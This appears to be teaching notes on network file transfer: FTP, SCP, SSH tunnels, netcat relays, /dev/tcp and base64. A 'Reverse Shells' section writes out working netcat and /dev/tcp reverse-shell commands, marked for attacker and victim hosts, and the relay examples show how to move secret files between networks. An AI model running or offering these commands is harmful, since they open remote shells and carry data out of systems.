# File Transfer and Redirection

## Outcomes

- Describe Data Transfer and Exfiltration
- Demonstrate File Transfer
- Standard Methods -- Identify and apply standard file transfer techniques
- FTP Modes -- Distinguish between Active and Passive FTP operations
- Use SCP -- Securely transfer files using Secure Copy Protocol
- Protocol Overview -- Describe common methods for transferring data across networks

---

## Common File Transfer Methods

| Method | Description |
|---|---|
| TFTP | Trivial File Transfer Protocol; lightweight, no authentication |
| FTP | File Transfer Protocol; standard method with username/password authentication |
| Active FTP | Client opens a port and waits for server to connect; firewall-sensitive |
| Passive FTP | Server opens a port and client connects; firewall-friendly |
| FTPS | FTP over SSL/TLS; adds encryption to traditional FTP |
| SFTP | SSH File Transfer Protocol; secure and encrypted, uses SSH |
| SCP | Secure Copy Protocol; transfers files securely via SSH |

---

## FTP Protocol Overview

- **RFC:** 959
- **Transport:** TCP
- **Connections:**
  - Control Connection: Port 21
  - Data Connection: Port 20 (Active mode)
- **Authentication:** Supports anonymous login; user credentials sent in clear-text
- **Features:** Directory services, binary and ASCII transfer modes
- **Security:** Insecure by default (no encryption)

---

## FTP Active Mode

Client opens a port and waits for server to connect for data transfer.

### Anonymous Login Example

```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
Name (10.0.0.104:bob): anonymous
Password: (no password)
230 Anonymous access granted
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp ftp 8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp ftp   74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp ftp  170 Aug 30 2021 welcome.msg
226 Transfer complete
```

### Authenticated User Example

```
Name: james
Password: (password)
230 User james logged in
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
226 Transfer complete
```

---

## FTP Passive Mode

Server opens a port and client connects for data transfer.

### Anonymous Login with ProxyChains

```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
Name: anonymous
Password: (no password)
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,162,147)
-rw-r--r--   1 ftp ftp 8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp ftp   74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp ftp  170 Aug 30 2021 welcome.msg
226 Transfer complete
```

### Automated Retrieval with Wget

```bash
proxychains wget -r ftp://10.0.0.104
```

---

## Secure File Transfer Protocols

### FTPS -- File Transfer Protocol Secure

| Feature | Details |
|---|---|
| Security | Adds SSL/TLS encryption to standard FTP |
| Explicit Mode | Ports 20 (data) and 21 (control); client requests encryption |
| Implicit Mode | Ports 989 (data) and 990 (control); encryption assumed from start |
| Terminal Access | Interactive |

### SFTP -- Secure File Transfer Protocol

| Feature | Details |
|---|---|
| Transport | TCP (Port 22) |
| Security | Uses SSH for secure channel |
| Authentication | Username/password or SSH key |
| Terminal Access | Interactive |
| Features | FTP-like services over SSH |

### Comparison Summary

| Feature | FTPS | SFTP |
|---|---|---|
| Encryption | SSL/TLS | SSH |
| Ports | 20/21 (Explicit), 989/990 (Implicit) | 22 |
| Authentication | Username/password (clear-text optional) | Username/password or SSH key |
| Protocol Base | FTP | SSH |
| Security by Default | No (Explicit mode optional) | Yes (always encrypted) |

---

## SCP -- Secure Copy Protocol

- **Transport:** TCP (Port 22)
- **Encryption:** Symmetric and asymmetric via SSH
- **Authentication:** Username/password or SSH key
- **Interaction:** Non-interactive file transfer

### SCP Command Options

| Option | Description |
|---|---|
| `.` | Present working directory |
| `-v` | Verbose mode |
| `-P` | Specify alternate port |
| `-r` | Recursively copy entire directory |
| `-3` | 3-way copy (remote-to-remote via local) |

### SCP Syntax Examples

```bash
# Download file from remote to local
scp student@172.16.82.106:secretstuff.txt /home/student

# Upload file from local to remote
scp secretstuff.txt student@172.16.82.106:/home/student

# Remote-to-remote copy
scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

# Recursive upload of folder
scp -r folder/ student@172.16.82.106:

# Recursive download of folder
scp -r student@172.16.82.106:folder/ .
```

### SCP with Alternate SSH Port

```bash
# Download using alternate SSHD port
scp -P 1111 student@172.16.82.106:secretstuff.txt .

# Upload using alternate SSHD port
scp -P 1111 secretstuff.txt student@172.16.82.106:
```

### SCP via Local Port Forwarding

```bash
# Create local port forward
ssh student@172.16.82.106 -L 1111:localhost:22 -NT

# Download via tunnel
scp -P 1111 student@localhost:secretstuff.txt /home/student

# Upload via tunnel
scp -P 1111 secretstuff.txt student@localhost:/home/student
```

### SCP via Dynamic Port Forwarding

```bash
# Create dynamic port forward
ssh student@172.16.82.106 -D 9050 -NT

# Download via proxychains
proxychains scp student@localhost:secretstuff.txt .

# Upload via proxychains
proxychains scp secretstuff.txt student@localhost:
```

---

## Uncommon Methods of File Transfer

### Netcat Overview

- Reads/writes data across network sockets using TCP/IP
- Capabilities: Inbound/outbound TCP/UDP connections, troubleshooting, sending/receiving data, port scanning

### Netcat Modes

```bash
# Server mode
nc -lvp 1111

# Client mode
nc 10.10.0.40 1111
```

### Netcat File Transfer Examples

```bash
# Client to Listener (Send File)
# Listener:
nc -lvp 9001 > newfile.txt
# Client:
nc 172.16.82.106 9001 < file.txt

# Listener to Client (Send File)
# Listener:
nc -lvp 9001 < file.txt
# Client:
nc 172.16.82.106 9001 > newfile.txt
```

### Named vs Unnamed Pipes

```bash
# Unnamed pipe example
ip address | grep inet

# Named pipe creation
mknod pipe p
mkfifo pipe

# File descriptors
# 0 = STDIN
# 1 = STDOUT
# 2 = STDERR
```

### Netcat Relay -- Listener to Listener

```bash
# Relay Host (Blue_Host-1):
mknod mypipe p
nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

# Sender (Internet_Host):
nc 172.16.82.106 1111 < secret.txt

# Receiver (Blue_Priv_Host-1):
nc 192.168.1.1 3333 > newsecret.txt
```

### Netcat Relay -- Client to Client

```bash
# Sender (Internet_Host):
nc -lvp 1111 < secret.txt

# Receiver (Blue_Priv_Host-1):
nc -lvp 3333 > newsecret.txt

# Relay Host (Blue_Host-1):
mknod mypipe p
nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```

### Netcat Relay -- Client to Listener

```bash
# Sender (Internet_Host):
nc -lvp 1111 < secret.txt

# Receiver (Blue_Priv_Host-1):
nc 192.168.1.1 3333 > newsecret.txt

# Relay Host (Blue_Host-1):
mknod mypipe p
nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
```

### Netcat Relay -- Listener to Client

```bash
# Sender (Internet_Host):
nc 172.16.82.106 1111 < secret.txt

# Receiver (Blue_Priv_Host-1):
nc -lvp 3333 > newsecret.txt

# Relay Host (Blue_Host-1):
mknod mypipe p
nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```

---

## File Transfer Using /dev/tcp

```bash
# Send file (no Netcat available)
# Receiver:
nc -lvp 1111 > secret.txt
# Sender:
cat secret.txt > /dev/tcp/10.10.0.40/1111

# Receive file (no Netcat available)
# Sender:
nc -lvp 1111 < secret.txt
# Receiver:
cat < /dev/tcp/10.10.0.40/1111 > secret.txt
```

---

## Reverse Shells

### Reverse Shell using Netcat

```bash
# Listener (attacker machine)
nc -lvp 9999

# Victim using -c option
nc -c /bin/bash IP_ADDRESS PORT

# Victim using -e option
nc -e /bin/bash IP_ADDRESS PORT
```

### Reverse Shell using /dev/tcp

```bash
# Listener (attacker machine)
nc -lvp 9999

# Victim
/bin/bash -i > /dev/tcp/IP_ADDRESS/PORT 0<&1 2>&1
```

### Reverse Shell using Python3

```python
PORT = 1234
server.bind(('', PORT))
# Leave empty string '' to bind to all interfaces
# This script runs on the attacker's machine and waits for incoming connections.
```

---

## ASCII to Base64 File Transfer

### Convert ASCII to Base64

Example: "Test"
- Binary: T = 01010100, e = 01100101, s = 01110011, t = 01110100
- Group into 6-bit chunks, map to Base64 table
- Result: `VGVzdA==`
- Add `=` padding if needed

### Encode a File to Base64 (No Line Wrap)

```bash
base64 -w0 FILE_NAME
# Example:
base64 -w0 logoCyber.png
```

### Transfer the Base64 Output

1. Create a new file: `nano b64image.txt`
2. Paste the Base64 output, save & exit

### Decode Base64 Back to Original File

```bash
base64 -d b64image.txt > logoCyber.png
```

### Base64 Encoding Table (Quick Reference)

| Index | Binary | Char | | Index | Binary | Char | | Index | Binary | Char | | Index | Binary | Char |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 0 | 000000 | A | | 16 | 010000 | Q | | 32 | 100000 | g | | 48 | 110000 | w |
| 1 | 000001 | B | | 17 | 010001 | R | | 33 | 100001 | h | | 49 | 110001 | x |
| 2 | 000010 | C | | 18 | 010010 | S | | 34 | 100010 | i | | 50 | 110010 | y |
| 3 | 000011 | D | | 19 | 010011 | T | | 35 | 100011 | j | | 51 | 110011 | z |
| 4 | 000100 | E | | 20 | 010100 | U | | 36 | 100100 | k | | 52 | 110100 | 0 |
| 5 | 000101 | F | | 21 | 010101 | V | | 37 | 100101 | l | | 53 | 110101 | 1 |
| 6 | 000110 | G | | 22 | 010110 | W | | 38 | 100110 | m | | 54 | 110110 | 2 |
| 7 | 000111 | H | | 23 | 010111 | X | | 39 | 100111 | n | | 55 | 110111 | 3 |
| 8 | 001000 | I | | 24 | 011000 | Y | | 40 | 101000 | o | | 56 | 111000 | 4 |
| 9 | 001001 | J | | 25 | 011001 | Z | | 41 | 101001 | p | | 57 | 111001 | 5 |
| 10 | 001010 | K | | 26 | 011010 | a | | 42 | 101010 | q | | 58 | 111010 | 6 |
| 11 | 001011 | L | | 27 | 011011 | b | | 43 | 101011 | r | | 59 | 111011 | 7 |
| 12 | 001100 | M | | 28 | 011100 | c | | 44 | 101100 | s | | 60 | 111100 | 8 |
| 13 | 001101 | N | | 29 | 011101 | d | | 45 | 101101 | t | | 61 | 111101 | 9 |
| 14 | 001110 | O | | 30 | 011110 | e | | 46 | 101110 | u | | 62 | 111110 | + |
| 15 | 001111 | P | | 31 | 011111 | f | | 47 | 101111 | v | | 63 | 111111 | / |

Padding character: `=` is used when input is not a multiple of 3 bytes.
